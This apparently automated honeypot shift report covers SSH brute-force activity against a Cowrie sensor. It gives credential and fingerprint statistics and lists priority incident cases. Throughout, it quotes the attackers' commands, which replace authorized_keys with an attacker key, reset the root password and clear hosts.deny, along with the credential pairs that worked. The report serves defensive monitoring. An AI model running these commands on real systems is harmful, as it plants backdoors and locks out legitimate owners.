# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T14:57:56Z |
| **Shift Time** | 14:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **215** |
| Confirmed Threats | **182** |
| False Positives Filtered | **33** (15.3%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **10** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **194** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **163** |
| Unique Credential Pairs | **89** |
| Unique Usernames | **48** |
| Unique Passwords | **83** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 29 |
| `root` | 21 |
| `admin` | 13 |
| `345gs5662d34` | 11 |
| `test` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 10 |
| `123123` | 6 |
| `admin` | 4 |
| `12345678` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 10 |
| `test3` | `123123` | 3 |
| `test` | `qwerty12` | 3 |
| `root` | `admin1235` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin1235` | `120.48.26.185` | 2026-05-10T13:39:15 |
| `root` | `3245gs5662d34` | `120.48.26.185` | 2026-05-10T13:39:30 |
| `root` | `debian7svm` | `150.136.129.10` | 2026-05-10T13:43:31 |
| `root` | `3245gs5662d34` | `150.136.129.10` | 2026-05-10T13:43:37 |
| `root` | `admin123$%^` | `120.48.26.185` | 2026-05-10T13:44:03 |
| `root` | `admin1235` | `87.106.44.172` | 2026-05-10T14:14:24 |
| `root` | `3245gs5662d34` | `87.106.44.172` | 2026-05-10T14:14:28 |
| `root` | `admin123$%^` | `87.106.44.172` | 2026-05-10T14:20:45 |
| `root` | `admin@#$%` | `87.106.44.172` | 2026-05-10T14:23:54 |
| `root` | `admin!QAZ` | `175.118.127.138` | 2026-05-10T14:38:11 |
| `root` | `3245gs5662d34` | `175.118.127.138` | 2026-05-10T14:38:15 |
| `root` | `helloadmin` | `50.84.211.204` | 2026-05-10T14:46:42 |
| `root` | `3245gs5662d34` | `50.84.211.204` | 2026-05-10T14:46:48 |
| `root` | `helloadmin` | `175.118.127.138` | 2026-05-10T14:54:34 |
| `root` | `admin1235` | `190.181.25.210` | 2026-05-10T14:55:02 |
| `root` | `3245gs5662d34` | `190.181.25.210` | 2026-05-10T14:55:09 |
| `root` | `admin!QAZ` | `50.84.211.204` | 2026-05-10T14:56:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **215** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 180 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 144 | 7 |
| `03a80b21afa8...` | Modern SSH client | 29 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 144 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 29 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xJPDtMdm21Jt"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.26.185`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.26.185`, `50.84.211.204`, `87.106.44.172`, `190.181.25.210`, `175.118.127.138`, `150.136.129.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **17** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS151729` | SWIFTIFY PRIVATE LIMITED | 1 | LOW |
| `AS36149` | Hawaiian Telcom Services Company, Inc. | 1 | HIGH |
| `AS9299` | Philippine Long Distance Telephone Company | 1 | LOW |
| `AS140527` | China Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1284cde5364a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-05-10 13:39 |
| **Last Seen** | 2026-05-10 13:39 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:39:13` | `cowrie.session.connect` |
| `2026-05-10 13:39:13` | `cowrie.client.version` |
| `2026-05-10 13:39:13` | `cowrie.client.kex` |
| `2026-05-10 13:39:15` | `cowrie.login.success` |
| `2026-05-10 13:39:15` | `cowrie.session.params` |
| `2026-05-10 13:39:15` | `cowrie.command.input` |
| `2026-05-10 13:39:15` | `cowrie.command.failed` |
| `2026-05-10 13:39:16` | `cowrie.log.closed` |
| `2026-05-10 13:39:18` | `cowrie.session.params` |
| `2026-05-10 13:39:18` | `cowrie.command.input` |
| `2026-05-10 13:39:18` | `cowrie.session.file_download` |
| `2026-05-10 13:39:18` | `cowrie.log.closed` |
| `2026-05-10 13:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a1420d1e89

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-05-10 13:39 |
| **Last Seen** | 2026-05-10 13:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:39:29` | `cowrie.session.connect` |
| `2026-05-10 13:39:29` | `cowrie.client.version` |
| `2026-05-10 13:39:29` | `cowrie.client.kex` |
| `2026-05-10 13:39:30` | `cowrie.login.success` |
| `2026-05-10 13:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54de44a28a35

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-10 13:43 |
| **Last Seen** | 2026-05-10 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:43:30` | `cowrie.session.connect` |
| `2026-05-10 13:43:30` | `cowrie.client.version` |
| `2026-05-10 13:43:30` | `cowrie.client.kex` |
| `2026-05-10 13:43:31` | `cowrie.login.success` |
| `2026-05-10 13:43:32` | `cowrie.session.params` |
| `2026-05-10 13:43:32` | `cowrie.command.input` |
| `2026-05-10 13:43:32` | `cowrie.command.failed` |
| `2026-05-10 13:43:32` | `cowrie.log.closed` |
| `2026-05-10 13:43:33` | `cowrie.session.params` |
| `2026-05-10 13:43:33` | `cowrie.command.input` |
| `2026-05-10 13:43:33` | `cowrie.session.file_download` |
| `2026-05-10 13:43:33` | `cowrie.log.closed` |
| `2026-05-10 13:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798d2ebb2681

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-10 13:43 |
| **Last Seen** | 2026-05-10 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:43:36` | `cowrie.session.connect` |
| `2026-05-10 13:43:36` | `cowrie.client.version` |
| `2026-05-10 13:43:36` | `cowrie.client.kex` |
| `2026-05-10 13:43:37` | `cowrie.login.success` |
| `2026-05-10 13:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a96bb1a5984

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-05-10 13:43 |
| **Last Seen** | 2026-05-10 13:44 |
| **Session Duration** | 57s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xJPDtMdm21Jt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:43:57` | `cowrie.session.connect` |
| `2026-05-10 13:43:57` | `cowrie.client.version` |
| `2026-05-10 13:44:00` | `cowrie.client.kex` |
| `2026-05-10 13:44:03` | `cowrie.login.success` |
| `2026-05-10 13:44:05` | `cowrie.session.params` |
| `2026-05-10 13:44:05` | `cowrie.command.input` |
| `2026-05-10 13:44:05` | `cowrie.command.failed` |
| `2026-05-10 13:44:07` | `cowrie.log.closed` |
| `2026-05-10 13:44:09` | `cowrie.session.params` |
| `2026-05-10 13:44:09` | `cowrie.command.input` |
| `2026-05-10 13:44:09` | `cowrie.session.file_download` |
| `2026-05-10 13:44:09` | `cowrie.log.closed` |
| `2026-05-10 13:44:25` | `cowrie.session.params` |
| `2026-05-10 13:44:25` | `cowrie.command.input` |
| `2026-05-10 13:44:28` | `cowrie.log.closed` |
| `2026-05-10 13:44:29` | `cowrie.session.params` |
| `2026-05-10 13:44:29` | `cowrie.command.input` |
| `2026-05-10 13:44:30` | `cowrie.log.closed` |
| `2026-05-10 13:44:31` | `cowrie.session.params` |
| `2026-05-10 13:44:31` | `cowrie.command.input` |
| `2026-05-10 13:44:31` | `cowrie.session.file_download` |
| `2026-05-10 13:44:31` | `cowrie.log.closed` |
| `2026-05-10 13:44:32` | `cowrie.session.params` |
| `2026-05-10 13:44:32` | `cowrie.command.input` |
| `2026-05-10 13:44:32` | `cowrie.log.closed` |
| `2026-05-10 13:44:34` | `cowrie.session.params` |
| `2026-05-10 13:44:34` | `cowrie.command.input` |
| `2026-05-10 13:44:34` | `cowrie.log.closed` |
| `2026-05-10 13:44:36` | `cowrie.session.params` |
| `2026-05-10 13:44:36` | `cowrie.command.input` |
| `2026-05-10 13:44:36` | `cowrie.command.input` |
| `2026-05-10 13:44:38` | `cowrie.log.closed` |
| `2026-05-10 13:44:39` | `cowrie.session.params` |
| `2026-05-10 13:44:39` | `cowrie.command.input` |
| `2026-05-10 13:44:39` | `cowrie.log.closed` |
| `2026-05-10 13:44:41` | `cowrie.session.params` |
| `2026-05-10 13:44:41` | `cowrie.command.input` |
| `2026-05-10 13:44:41` | `cowrie.log.closed` |
| `2026-05-10 13:44:43` | `cowrie.session.params` |
| `2026-05-10 13:44:43` | `cowrie.command.input` |
| `2026-05-10 13:44:44` | `cowrie.log.closed` |
| `2026-05-10 13:44:45` | `cowrie.session.params` |
| `2026-05-10 13:44:45` | `cowrie.command.input` |
| `2026-05-10 13:44:45` | `cowrie.log.closed` |
| `2026-05-10 13:44:46` | `cowrie.session.params` |
| `2026-05-10 13:44:46` | `cowrie.command.input` |
| `2026-05-10 13:44:46` | `cowrie.log.closed` |
| `2026-05-10 13:44:47` | `cowrie.session.params` |
| `2026-05-10 13:44:47` | `cowrie.command.input` |
| `2026-05-10 13:44:47` | `cowrie.log.closed` |
| `2026-05-10 13:44:49` | `cowrie.session.params` |
| `2026-05-10 13:44:49` | `cowrie.command.input` |
| `2026-05-10 13:44:50` | `cowrie.log.closed` |
| `2026-05-10 13:44:50` | `cowrie.session.params` |
| `2026-05-10 13:44:50` | `cowrie.command.input` |
| `2026-05-10 13:44:51` | `cowrie.log.closed` |
| `2026-05-10 13:44:52` | `cowrie.session.params` |
| `2026-05-10 13:44:52` | `cowrie.command.input` |
| `2026-05-10 13:44:53` | `cowrie.log.closed` |
| `2026-05-10 13:44:55` | `cowrie.session.params` |
| `2026-05-10 13:44:55` | `cowrie.command.input` |
| `2026-05-10 13:44:55` | `cowrie.log.closed` |
| `2026-05-10 13:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3934b92780a1

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:14 |
| **Last Seen** | 2026-05-10 14:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:14:23` | `cowrie.session.connect` |
| `2026-05-10 14:14:23` | `cowrie.client.version` |
| `2026-05-10 14:14:23` | `cowrie.client.kex` |
| `2026-05-10 14:14:24` | `cowrie.login.success` |
| `2026-05-10 14:14:24` | `cowrie.session.params` |
| `2026-05-10 14:14:24` | `cowrie.command.input` |
| `2026-05-10 14:14:24` | `cowrie.command.failed` |
| `2026-05-10 14:14:24` | `cowrie.log.closed` |
| `2026-05-10 14:14:25` | `cowrie.session.params` |
| `2026-05-10 14:14:25` | `cowrie.command.input` |
| `2026-05-10 14:14:25` | `cowrie.session.file_download` |
| `2026-05-10 14:14:25` | `cowrie.log.closed` |
| `2026-05-10 14:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9dd972126a

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:14 |
| **Last Seen** | 2026-05-10 14:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:14:27` | `cowrie.session.connect` |
| `2026-05-10 14:14:27` | `cowrie.client.version` |
| `2026-05-10 14:14:27` | `cowrie.client.kex` |
| `2026-05-10 14:14:28` | `cowrie.login.success` |
| `2026-05-10 14:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c68d9de1b10

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:20 |
| **Last Seen** | 2026-05-10 14:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:20:45` | `cowrie.session.connect` |
| `2026-05-10 14:20:45` | `cowrie.client.version` |
| `2026-05-10 14:20:45` | `cowrie.client.kex` |
| `2026-05-10 14:20:45` | `cowrie.login.success` |
| `2026-05-10 14:20:46` | `cowrie.session.params` |
| `2026-05-10 14:20:46` | `cowrie.command.input` |
| `2026-05-10 14:20:46` | `cowrie.command.failed` |
| `2026-05-10 14:20:46` | `cowrie.log.closed` |
| `2026-05-10 14:20:46` | `cowrie.session.params` |
| `2026-05-10 14:20:46` | `cowrie.command.input` |
| `2026-05-10 14:20:46` | `cowrie.session.file_download` |
| `2026-05-10 14:20:46` | `cowrie.log.closed` |
| `2026-05-10 14:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e4c3a30ea2

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:20 |
| **Last Seen** | 2026-05-10 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:20:49` | `cowrie.session.connect` |
| `2026-05-10 14:20:49` | `cowrie.client.version` |
| `2026-05-10 14:20:49` | `cowrie.client.kex` |
| `2026-05-10 14:20:49` | `cowrie.login.success` |
| `2026-05-10 14:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83fb641dc0cc

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:23 |
| **Last Seen** | 2026-05-10 14:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:23:54` | `cowrie.session.connect` |
| `2026-05-10 14:23:54` | `cowrie.client.version` |
| `2026-05-10 14:23:54` | `cowrie.client.kex` |
| `2026-05-10 14:23:54` | `cowrie.login.success` |
| `2026-05-10 14:23:55` | `cowrie.session.params` |
| `2026-05-10 14:23:55` | `cowrie.command.input` |
